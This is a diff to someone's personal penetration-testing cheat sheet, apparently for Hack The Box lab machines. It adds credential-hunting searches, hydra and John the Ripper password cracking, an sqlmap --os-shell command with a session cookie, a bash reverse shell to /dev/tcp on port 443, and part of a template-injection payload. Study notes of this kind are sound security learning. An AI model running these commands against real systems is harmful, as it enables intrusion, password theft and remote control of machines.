@@ -24,6 +24,15 @@ netCat for windows:
  
  smbclient  \\\\10.10.10.131\\ADMIN$ -U Administrator
 
+ Search:
+ grep -r -i -n "pass" .
+ find ~ -iname "*flag*" -type f
+ cat /etc/passwd
+ find / -group bugtracker 2>/dev/null    <<< find files in that group
+ ip <<<< show info about user
+ ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
+
+
 
 Nmap stuff ################################################################
 >nmap -p- --min-rate=1000 -sV {target_IP}
@@ -54,6 +63,9 @@ gobuster:
 
 Brute Force password cracking:
 hydra -L usernames.txt -p 'funnel123#!#' {target_IP} ssh
+zip2john  << for zipped files
+john -wordlist=/usr/share/wordlists/rockyou.txt hashes  <<< run john with a wordlist against some hashes
+hashid 2cb42f8734ea607eefed3b70af13bbd3
 
 
 
@@ -86,7 +98,11 @@ Web add in shows you what platform is bing run.
 BurpSuite:
 Super good for sending unintended shit to a web page
 
-
+---------------INJECTION--------------
+==========================
+>>> sqlmap 
+>>> sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell << this will get you OS shell
+>>>> bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"  << Payload for netcat session on port 443
 Server Side Template Injection vulnerability Example injection:
 {{#with "s" as |string|}}
  {{#with "e"}}
@@ -126,5 +142,6 @@ https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fme
 Web Proxies:
 https://academy.hackthebox.eu/course/preview/using-web-proxies
 
-Parrot OS, it is possible to find webshells under the folder /usr/share/webshells/
+Parrot OS, it is possible to find webshells under the folder 
+        ------- /usr/share/webshells/
 
